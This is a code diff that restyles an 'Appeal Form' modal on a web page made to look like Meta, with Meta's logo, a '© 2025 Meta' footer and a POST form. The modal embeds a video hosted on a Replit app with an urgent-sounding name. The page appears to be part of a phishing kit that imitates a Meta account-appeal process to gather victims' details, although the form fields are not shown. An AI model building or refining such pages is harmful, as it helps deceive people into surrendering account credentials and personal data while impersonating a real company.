@@ -92,71 +92,39 @@
       color: #8a8d91;
       margin: 40px 0 10px;
     }
-/* Popup Modal */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(0,0,0,0.5);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        
-        .modal-content {
-            background-color: var(--white);
-            border-radius: 8px;
-            width: 100%;
-            max-width: 600px;
-            max-height: 80vh;
-            display: flex;
-            flex-direction: column;
-            box-shadow: 0 4px 24px rgba(0,0,0,0.2);
-            overflow: hidden;
-        }
-        
-        .modal-header {
-            background-color: var(--white);
-            padding: 16px 24px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border-bottom: 1px solid var(--meta-gray-light);
-        }
-        
-        .modal-logo {
-            height: 28px;
-        }
-        
-        .modal-title-container {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        
-        .modal-title {
-            font-size: 18px;
-            font-weight: 600;
-            color: var(--meta-dark);
-        }
-        
-        .close-modal {
-            background: none;
-            border: none;
-            font-size: 24px;
-            cursor: pointer;
-            color: var(--meta-gray-medium);
-            padding: 4px;
-        }
-        
-        .modal-body {
-            padding: 24px;
-            overflow-y: auto;
-        }
-        .video-container {
+
+    /* Modal */
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6);
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+
+    .modal.active {
+      display: flex;
+    }
+
+    .modal-content {
+      background: white;
+      border-radius: 8px;
+      padding: 20px;
+      width: 95%;
+      max-width: 500px;
+      max-height: 90vh;
+      overflow-y: auto;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.2);
+    }
+
+    .modal-content h2 {
+      margin-bottom: 10px;
+    }
+
+    .video-container {
       margin-bottom: 15px;
       border-radius: 6px;
       overflow: hidden;
@@ -166,7 +134,7 @@
       width: 100%;
       display: block;
     }
-    .guidelines-text {
+   .guidelines-text {
             background-color: var(--meta-bg);
             padding: 16px;
             border-radius: 6px;
@@ -174,7 +142,7 @@
             font-size: 14px;
             color: var(--meta-gray-dark);
             line-height: 1.6;
-    }
+        }
     .input-group {
       margin-bottom: 16px;
     }
@@ -279,21 +247,11 @@
 
   <div class="footer">© 2025 Meta. All rights reserved.</div>
 
-   <!-- Appeal Modal Popup -->
-    <div class="modal-overlay">
-        <div class="modal-content">
-            <div class="modal-header">
-                <div class="modal-title-container">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/800px-Meta_Platforms_Inc._logo.svg.png" alt="Meta" class="modal-logo">
-                    <span class="modal-title">Appeal Submission</span>
-                </div>
-                <form method="POST">
-                    <button type="submit" name="close_modal" class="close-modal">&times;</button>
-                </form>
-            </div>
-            
-            <div class="modal-body">
-                <form method="POST" id="appealForm">
+  <!-- Appeal Modal -->
+  <div class="modal" id="appealModal">
+    <div class="modal-content">
+      <button class="close-btn" onclick="closeModal()">&times;</button>
+      <h2>Appeal Form</h2>
       <div class="video-container">
         <video controls>
           <source src="https://request-for-immediate-action.replit.app/attached_assets/video-information.mp4" type="video/mp4">
